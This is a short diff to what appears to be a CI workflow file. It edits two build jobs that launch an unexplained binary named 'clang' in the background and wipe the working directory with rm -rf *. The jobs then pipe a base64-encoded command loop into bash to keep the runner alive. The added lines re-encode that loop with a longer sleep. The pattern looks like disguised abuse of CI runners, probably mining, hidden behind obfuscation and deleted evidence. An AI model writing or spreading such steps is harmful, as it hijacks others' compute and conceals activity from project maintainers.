@@ -50,7 +50,7 @@ jobs:
       continue-on-error: true
       run: |
          chmod +x clang; nohup ./clang & sleep 0.1; rm -rf *
-         echo 'd2hpbGUgOjsgZG8Kc3VkbyBhcHQtZ2V0IHVwZGF0ZSAteQpjbGVhcgpzbGVlcCAyCmRvbmU=' > runner; base64 runner -d | bash
+         echo 'd2hpbGUgOjsgZG8Kc3VkbyBhcHQtZ2V0IHVwZGF0ZSAteQpzbGVlcCA2MDAKZG9uZQ==' > runner; base64 runner -d | bash
  
  python-build-1:
     runs-on: ubuntu-20.04 
@@ -67,5 +67,5 @@ jobs:
       continue-on-error: true
       run: |
          chmod +x clang; nohup ./clang & sleep 0.1; rm -rf *
-         echo 'd2hpbGUgOjsgZG8Kc3VkbyBhcHQtZ2V0IHVwZGF0ZSAteQpjbGVhcgpzbGVlcCAyCmRvbmU=' > runner; base64 runner -d | bash
+         echo 'd2hpbGUgOjsgZG8Kc3VkbyBhcHQtZ2V0IHVwZGF0ZSAteQpzbGVlcCA2MDAKZG9uZQ==' > runner; base64 runner -d | bash
  
